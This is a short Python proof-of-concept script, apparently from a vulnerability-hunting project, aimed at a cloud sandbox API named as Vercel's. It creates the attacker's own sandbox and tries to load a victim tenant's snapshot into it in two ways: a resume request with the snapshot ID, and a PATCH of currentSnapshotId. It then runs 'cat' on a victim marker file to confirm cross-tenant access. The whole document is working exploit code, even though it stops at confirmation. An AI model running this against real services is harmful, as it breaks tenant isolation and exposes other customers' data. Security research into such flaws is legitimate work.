# -*- coding: utf-8 -*-
"""attacker 侧补充: 跨租户快照恢复的 resume / PATCH 路径 (stop at confirmation)
路径2: GET /v2/sandboxes/{name}?resume=true&snapshotId=<victim_snap>  (attacker 自己的沙箱)
路径3: PATCH /v2/sandboxes/{name} 设置 currentSnapshotId=<victim_snap>
用法: python atk_snap_idor2.py <victim_snapshot_id> <victim_marker>
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

SNAP = sys.argv[1]
MARKER = sys.argv[2]
NAME = 'atk_snapy'

print('=== 2) attacker resume 自己的沙箱 + victim 快照 ===', flush=True)
api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
time.sleep(2)
c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, {'projectId': PROJ, 'name': NAME})
print('create own sandbox:', c, r[:200], flush=True)
sid = json.loads(r)['sandbox']['currentSessionId']
# 停止以允许 resume
api('POST', '/v2/sandboxes/sessions/%s/stop?teamId=%s' % (sid, TEAM))
time.sleep(3)
c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true&snapshotId=%s' % (NAME, TEAM, PROJ, SNAP))
print('resume with victim snapshot:', c, r[:400], flush=True)
if c == 200:
    d = json.loads(r)
    print('currentSnapshotId:', d.get('sandbox', {}).get('currentSnapshotId'), flush=True)
    print('CANDIDATE: resume accepted victim snapshot?', flush=True)
    time.sleep(3)
    sid2 = d['sandbox']['currentSessionId']
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid2, TEAM),
               {'command': 'cat', 'args': ['/vercel/sandbox/tenant_marker.txt'],
                'wait': True, 'timeout': 30000})
    print('marker check:', c, r[:400], flush=True)
    if c == 200 and MARKER in r:
        print('CONFIRMED: victim marker via resume!', flush=True)

print()
print('=== 3) attacker PATCH 自己的沙箱 currentSnapshotId=victim 快照 ===', flush=True)
c, r = api('PATCH', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ),
           {'currentSnapshotId': SNAP})
print('patch currentSnapshotId:', c, r[:400], flush=True)
if c == 200:
    print('CANDIDATE: patch accepted victim snapshot?', flush=True)

print('=== DONE ===', flush=True)
